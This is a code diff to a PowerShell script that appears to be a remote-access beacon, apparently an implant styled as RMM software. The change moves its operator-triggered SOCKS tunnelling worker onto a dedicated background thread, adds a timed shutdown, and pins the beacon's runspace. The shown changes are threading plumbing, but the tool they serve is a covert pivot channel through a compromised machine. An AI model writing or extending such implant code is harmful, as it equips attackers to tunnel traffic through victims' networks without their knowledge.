@@ -85,11 +85,12 @@ $script:RmmEverRegistered = $false
 $script:RmmVerbose = [bool]$verboseHttp
 $script:UsePersistentHttp = [bool]$persistentHttp
 $script:RmmShellCwd = (Get-Location).Path
+$script:RmmBeaconRunspace = $host.Runspace
 $script:RmmSocksWorker = @{
-    Running   = $false
-    Runspace  = $null
+    Running    = $false
+    Runspace   = $null
     PowerShell = $null
-    Async     = $null
+    Thread     = $null
 }
 $script:RmmSocksLogQueue = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
 
@@ -591,6 +592,7 @@ function Get-RmmCmdSocksActive {
 }
 
 function Drain-RmmSocksHostLog {
+    Restore-RmmHostRunspace
     if ($null -eq $script:RmmSocksLogQueue) { return }
     $line = $null
     while ($script:RmmSocksLogQueue.TryDequeue([ref]$line)) {
@@ -967,6 +969,7 @@ Write-RmmSocksHostLine '[*] SOCKS channel worker stopped'
         $script:RmmSocksLogQueue = $LogQueue
     }).AddArgument([bool]$script:RmmVerbose).AddArgument($socksCookie).AddArgument($script:RmmWebProxy).AddArgument($script:RmmSocksLogQueue)
     $initOut = $ps.Invoke()
+    Restore-RmmHostRunspace
     if ($ps.Streams.Error.Count -gt 0) {
         $errs = ($ps.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
         $ps.Streams.Error.Clear()
@@ -977,8 +980,22 @@ Write-RmmSocksHostLine '[*] SOCKS channel worker stopped'
     }
     $ps.Commands.Clear()
     [void]$ps.AddScript($workerScript)
+
+    $workerThread = New-Object System.Threading.Thread -ArgumentList ([System.Threading.ParameterizedThreadStart]{
+        param($state)
+        $workerPs = $state.PowerShell
+        $workerRs = $state.Runspace
+        $previousDefault = [runspace]::DefaultRunspace
+        try {
+            [runspace]::DefaultRunspace = $workerRs
+            $null = $workerPs.Invoke()
+        } finally {
+            [runspace]::DefaultRunspace = $previousDefault
+        }
+    })
+    $workerThread.IsBackground = $true
     try {
-        $async = $ps.BeginInvoke()
+        $workerThread.Start(@{ PowerShell = $ps; Runspace = $socksRs })
     } catch {
         Write-Host "[-] SOCKS channel worker failed to start: $($_.Exception.Message)" -ForegroundColor Red
         $ps.Dispose()
@@ -989,7 +1006,7 @@ Write-RmmSocksHostLine '[*] SOCKS channel worker stopped'
     $script:RmmSocksWorker.Running = $true
     $script:RmmSocksWorker.Runspace = $socksRs
     $script:RmmSocksWorker.PowerShell = $ps
-    $script:RmmSocksWorker.Async = $async
+    $script:RmmSocksWorker.Thread = $workerThread
     Write-Host "[*] SOCKS channel started (operator ran socks; logs below)" -ForegroundColor Cyan
     Drain-RmmSocksHostLog
     Restore-RmmHostRunspace
@@ -1002,15 +1019,20 @@ function Stop-RmmSocksChannelWorker {
     if ($rs) {
         try { $rs.SessionStateProxy.SetVariable('RmmSocksChannelStop', $true) } catch { }
     }
-    if ($ps -and $script:RmmSocksWorker.Async) {
-        try { $ps.EndInvoke($script:RmmSocksWorker.Async) } catch { }
+    $th = $script:RmmSocksWorker.Thread
+    if ($th -and $th.IsAlive) {
+        try {
+            if (-not $th.Join(15000)) {
+                Write-Host "[!] SOCKS channel thread did not stop within 15s" -ForegroundColor Yellow
+            }
+        } catch { }
     }
     if ($ps) { $ps.Dispose() }
     if ($rs) { $rs.Close() }
     $script:RmmSocksWorker.Running = $false
     $script:RmmSocksWorker.Runspace = $null
     $script:RmmSocksWorker.PowerShell = $null
-    $script:RmmSocksWorker.Async = $null
+    $script:RmmSocksWorker.Thread = $null
     Drain-RmmSocksHostLog
     Write-Host "[*] SOCKS channel stopped" -ForegroundColor Yellow
     Restore-RmmHostRunspace
@@ -1175,8 +1197,10 @@ function Get-RmmWebExceptionResponse {
 }
 
 function Restore-RmmHostRunspace {
-    if ($null -ne $host.Runspace -and [runspace]::DefaultRunspace -ne $host.Runspace) {
-        [runspace]::DefaultRunspace = $host.Runspace
+    $beacon = $script:RmmBeaconRunspace
+    if ($null -eq $beacon) { return }
+    if ([runspace]::DefaultRunspace -ne $beacon) {
+        [runspace]::DefaultRunspace = $beacon
     }
 }
 
